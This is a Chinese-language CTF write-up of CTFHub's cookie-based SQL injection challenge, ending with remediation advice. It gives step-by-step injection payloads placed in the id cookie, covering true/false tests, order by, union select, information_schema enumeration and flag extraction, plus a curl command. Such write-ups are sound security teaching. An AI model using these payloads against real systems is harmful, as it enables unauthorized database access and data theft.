CTFHub - Web - SQL注入 - Cookie注入

# CTFHub # Web # SQL注入 # Cookie注入 # UNION注入

一、题目信息

  • 题目名称：Cookie注入
  • 题目方向：Web - SQL注入
  • 题目环境：动态分配的 HTTP 服务地址
  • 题目目标：从 Cookie 注入点读取数据库中的 flag。

二、定位注入点

首次访问页面时，服务器明确下发了名为 id 的 Cookie：

HTTP/1.1 200 OK
Set-Cookie: id=1
Set-Cookie: hint=id输入1试试？

携带 id=1 请求后，页面回显实际执行的 SQL 和查询结果：

select * from news where id=1

ID: 1
Data: ctfhub

修改 Cookie 为 id=2 后返回另一条数据，说明 Cookie 值直接进入了服务端 SQL 查询，而不是只用于标识当前身份。

三、确认 SQL 注入

由于 id 两侧没有单引号，先按数字型注入验证真假条件：

Cookie: id=1 and 1=1

ID: 1
Data: ctfhub
Cookie: id=1 and 1=2

无查询结果

条件为真时正常返回，条件为假时无数据，可以确认 id Cookie 存在数字型 SQL 注入。

Cookie 与 URL 参数、POST 参数一样都属于客户端输入，服务端若不校验便拼接进 SQL，同样会产生注入漏洞。

四、确定查询列数

使用 order by 判断原查询列数：order by 2 正常返回，order by 3 无结果，因此共有两列。

再使用不存在的 id=-1 让 UNION 查询结果优先回显：

Cookie: id=-1 union select 1,2

ID: 1
Data: 2

两个列位都可以回显。后续将辅助信息放在第一列，将目标数据放在第二列。

五、获取数据库基本信息

Cookie: id=-1 union select version(),database()

ID: 10.3.22-MariaDB-0+deb10u1
Data: sqli

目标数据库为 sqli，数据库类型为 MariaDB。下一步通过 information_schema 枚举表名和字段名。

六、枚举表和字段

查询当前数据库中的全部表名：

Cookie: id=-1 union select 1,group_concat(table_name)
from information_schema.tables
where table_schema=database()

ID: 1
Data: jeeyegykwx,news

除业务表 news 外，还存在随机表名 jeeyegykwx。继续查询该表的字段：

Cookie: id=-1 union select 1,group_concat(column_name)
from information_schema.columns
where table_schema=database()
and table_name='jeeyegykwx'

ID: 1
Data: knbolfmpwt

目标数据位于 jeeyegykwx.knbolfmpwt。随机名称会随题目环境重新分配，实际解题时以当前查询结果为准。

七、读取 Flag

Cookie: id=-1 union select 1,group_concat(knbolfmpwt)
from jeeyegykwx

ID: 1
Data: ctfhub{8b3ee50ea5bbe9c22dff1a30}

使用 curl 复现完整请求：

curl.exe -H "Cookie: id=-1 union select 1,group_concat(knbolfmpwt) from jeeyegykwx" "http://<target>/"

八、最终 Flag

ctfhub{8b3ee50ea5bbe9c22dff1a30}

九、修复建议

  • 使用预处理语句和参数绑定，禁止将 Cookie 值直接拼接进 SQL 语句。
  • 对 id 等参数执行严格的整数类型校验，只接受合法数字。
  • 生产环境关闭 SQL 语句回显和详细数据库错误信息。
  • 数据库账号遵循最小权限原则，限制对 information_schema 和业务表的访问。
  • Cookie 完全由客户端控制，不能将其中的用户输入视为可信数据。

十、解题总结

本题的变化点是注入参数从 URL 转移到了 Cookie。识别出 id Cookie 被直接拼接到 SQL 后，仍可沿用数字型注入的常规流程：真假如条件判断、order by 判断列数、union select 回显、枚举数据库结构，最后读取目标字段。
